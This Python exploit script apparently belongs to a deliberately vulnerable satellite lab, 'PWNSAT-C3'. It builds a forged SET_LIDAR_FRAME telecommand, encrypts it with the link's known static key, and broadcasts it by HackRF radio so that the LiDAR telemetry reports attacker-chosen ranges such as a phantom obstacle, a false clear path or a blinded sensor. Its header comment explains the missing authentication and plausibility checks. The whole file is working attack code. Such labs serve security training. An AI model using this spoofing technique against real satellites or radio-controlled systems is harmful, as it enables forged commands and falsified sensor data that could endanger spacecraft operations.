#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 08_lidar_payload_spoof_rf.py -- payload-data spoofing of the Tau LiDAR
# payload subsystem over the CCSDS/LoRa uplink.
#
# Root cause: commandLidarFrameHandler() (Firmware/lidar.cpp) ingests the
# host-supplied depth summary verbatim -- no plausibility bound on the
# distances, no MISSION_MODE_PAYLOAD/payloadArmed gate, and no authentication
# of the payload source beyond the shared link (which uses a static, known AES
# key) -- then republishes it as authoritative spacecraft telemetry
# (SPP_APID_TM_LIDAR). Anyone who can put a SET_LIDAR_FRAME (0x15) on the
# uplink can make the satellite "see" whatever they want: a phantom obstacle
# right in front of it, a wide-open clear path, or a fully blinded sensor. The
# command works as designed -- the bug is that nobody checks whether the depth
# data is real or who is allowed to supply it.
#
# Usage:
#   ./08_lidar_payload_spoof_rf.py --preset collision
#   ./08_lidar_payload_spoof_rf.py --preset clear --min-mm 4400
#
# Expected: PWNSAT-C3's LiDAR panel jumps to the spoofed ranges, and the LIDAR
# status TM (0x14) downlink echoes them.

import argparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))
sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "Payloads" / "lidar"))

from pwnsat_packets import build_tc, encrypt_payload  # noqa: E402
from tau_lidar_payload import (  # noqa: E402
    DIST_INVALID,
    SPOOF_PRESETS,
    build_lidar_payload,
    spoof_summary,
)

from require_gnuradio import check as _check_gnuradio  # noqa: E402
_check_gnuradio()

from pwnsat_lora_tx import UPLINK_FREQ_HZ, transmit_packet  # noqa: E402

SPP_APID_TC_SET_LIDAR_FRAME = 0x15


def _mm(value):
    return "----" if value == DIST_INVALID else ("%dmm" % value)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--preset", choices=sorted(SPOOF_PRESETS), default="collision",
                        help="spoof scene to inject (default: collision)")
    parser.add_argument("--min-mm", type=int, default=None, help="override nearest distance")
    parser.add_argument("--mean-mm", type=int, default=None, help="override mean distance")
    parser.add_argument("--max-mm", type=int, default=None, help="override farthest distance")
    parser.add_argument("--center-mm", type=int, default=None, help="override center-pixel distance")
    parser.add_argument("--valid-pct", type=int, default=None, help="override valid-pixel percentage")
    parser.add_argument("--amplitude", type=int, default=None, help="override mean amplitude")
    parser.add_argument("--frame-type", type=int, default=2, help="TauLidar FrameType (0/1/2)")
    parser.add_argument("--frame-count", type=int, default=1, help="forged host frame counter")
    parser.add_argument("--seq", type=int, default=1, help="SPP sequence count")
    parser.add_argument("--encrypt", choices=["on", "off"], default="on")
    parser.add_argument("--device-args", default="hackrf", help="SoapySDR driver, e.g. 'hackrf'")
    parser.add_argument("--gain", type=int, default=20, help="HackRF TX (VGA) gain, dB")
    parser.add_argument("--frequency", type=int, default=UPLINK_FREQ_HZ, help="Hz")
    parser.add_argument("--quiet", action="store_true",
                        help="hide hackrf_transfer's own output (shown by default as "
                             "visible proof this is a real RF transmission, not just "
                             "this script's own print statements)")
    args = parser.parse_args()

    summary = spoof_summary(
        args.preset, frame_type=args.frame_type, frame_count=args.frame_count,
        min_mm=args.min_mm, mean_mm=args.mean_mm, max_mm=args.max_mm,
        center_mm=args.center_mm, valid_pct=args.valid_pct, amplitude=args.amplitude,
    )
    payload = build_lidar_payload(summary)
    wire_payload = encrypt_payload(payload) if args.encrypt == "on" else payload
    raw_spp = build_tc(SPP_APID_TC_SET_LIDAR_FRAME, wire_payload, args.seq)

    print("[*] LiDAR payload spoof (%s): min=%s mean=%s center=%s max=%s valid=%d%% "
          "-- no authentication required"
          % (args.preset, _mm(summary.min_mm), _mm(summary.mean_mm),
             _mm(summary.center_mm), _mm(summary.max_mm), summary.valid_pct))
    print("[*] SET_LIDAR_FRAME packet (%s, seq=%d): %s"
          % ("encrypted" if args.encrypt == "on" else "cleartext", args.seq, raw_spp.hex()))
    print("[*] Transmitting on %.3f MHz via %s (gain=%d dB)..."
          % (args.frequency / 1e6, args.device_args, args.gain))

    transmit_packet(raw_spp, frequency=args.frequency, device_args=args.device_args,
                    verbose=not args.quiet, tx_gain=args.gain)

    print("[+] Sent. Check PWNSAT-C3's LiDAR panel and the LIDAR TM (0x14) "
          "downlink -- the satellite should now report the spoofed ranges.")


if __name__ == "__main__":
    main()
